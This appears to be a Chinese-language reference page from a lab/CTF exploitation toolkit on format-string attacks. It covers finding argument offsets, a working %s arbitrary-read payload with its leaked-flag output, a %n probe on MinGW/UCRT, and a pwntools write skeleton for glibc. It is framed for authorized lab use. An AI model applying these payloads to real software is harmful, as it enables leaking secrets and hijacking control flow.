# 03 格式化串任意读（含 Windows/UCRT 边界）

> 配套 `Tool/skill/pwn-crypto/references/01-criteria.md`、`02-failure-criteria.md` 与
> 案例 `Tool/cases/pwn-crypto05`。只用于授权实验；先在本地复现，再谈远程。

## 入口信号

- 目标把用户输入直接交给 `printf/fprintf/syslog`（`printf(buf)`，而不是 `printf("%s", buf)`）。
- `pwn-check.py` 的 `format_string_risks` 出现 `%s/%p/%n`，且导入了格式化函数。
- 程序有“认证前/认证后”分支、全局 secret、GOT/函数指针等可读/可写目标。

## 0. 基线

```bash
gcc -O0 -fno-stack-protector -no-pie -o artifacts/fmt_read.exe input/fmt_read.c
nm artifacts/fmt_read.exe | grep -E ' secret| authenticated'
python Tool/scripts/pwn-check.py --file artifacts/fmt_read.exe --json
```

**确认判据**：能列出输入点、格式化调用点、目标全局变量的地址；`pwn-check` 能看到格式串风险。

## 1. 找参数位置（x86_64 SysV / Windows x64 都要实测）

```text
payload = b"AAAA." + b".%p" * 24
```

- Linux SysV：前 6 个整型参数在 rdi/rsi/rdx/rcx/r8/r9；第 7 个起在栈上。
- Windows x64：格式化串本身在 rcx；变参从 rdx/r8/r9 开始，第 4 个起在栈上。
- 在 `printf(buf)` 里，`buf` 的**内容**会占住从某个参数位置开始的栈槽：
  本案例 buf[0:8] 是第 4 个变参，buf[8:16] 是第 5 个，buf[16:24] 是第 6 个。

**确认判据**：在输出里看到 `0x41414141...` 或可识别的 buf 字节，记下它对应的参数序号。

## 2. 任意读：用 `%s` 解引用目标地址

```text
# 目标：secret 在 0x140003000；地址必须放在第 6 个变参槽（buffer 偏移 16）
fmt     = b"%p%p%p%p%p%s"          # 5 个 %p 消耗参数 1..5，%s 消耗参数 6
payload = fmt + b" " * (16-11) + p64(0x140003000) + b"\n"
```

原始结果（案例 `artifacts/leak_result.json`）：

```text
stdout: "...7070257025...FLAG{fmt_string_arbitrary_read_works}    \r\ndenied\r\n"
leaked_flag: true, authenticated: false, rc: 0
```

**确认判据**：目标地址的内容出现在输出里，且程序仍走“未认证”分支。
只打印 `%p` 的栈值不算任意读。

## 3. 任意写：先确认 `%n` 是否真的写

```c
int x = 0;
printf("abc%n\n", &x);
printf("x=%d\n", x);
```

本机实测（MinGW/UCRT，`artifacts/percent_n_result.txt`）：

```text
abcx=0
```

**失败判据**：`x` 仍为 0 → 该运行库不执行 `%n`。此时：

- Windows 目标：放弃 `%n` 写路线，保留 `%s/%p` 任意读；转堆/逻辑/导入表/CFG 路线。
- glibc 目标：`%n` 可用，但 64 位地址含 NUL，地址要放末尾；大值用 `%hn`，逐字节用 `%hhn`。

glibc 下的写入骨架：

```python
payload = fmtstr_payload(6, {target: value}, write_size="short")
# 写后必须读回目标地址的新值；连续两次写不崩；%n 计数与输出长度一致
```

## 4. 边界

- `%s` 解引用不可读地址会直接崩溃；先用 `%p`/可读全局变量校准。
- 输出缓冲/管道截断会让 `%n` 少写；必要时 `setvbuf(stdout, NULL, _IONBF, 0)` 或分段写。
- Windows 的 PE 没有 ELF GOT/RELRO；不要在这里找 `printf@got`。
- 远程与本地参数位置可能因调用约定/编译器不同而变化，参数序号必须远程重测。

## 失败判据

- 只拿到栈上 `%p` 值，没有目标内存内容 → 停在“疑似任意读”。
- `%n` 探针显示不写，仍继续构造 `%n` payload → 路线错误。
- 地址放在 payload 开头且含 `\x00`，printf 提前结束 → payload 结构错误。

## 边界（平台）

- 本页在 Windows/MinGW 上验证；Linux 的 `%n`、参数寄存器、GOT 布局不同，需在目标环境重跑。
- 任何写入目标必须是授权实验环境内的变量/GOT/返回地址；不用于真实生产系统。
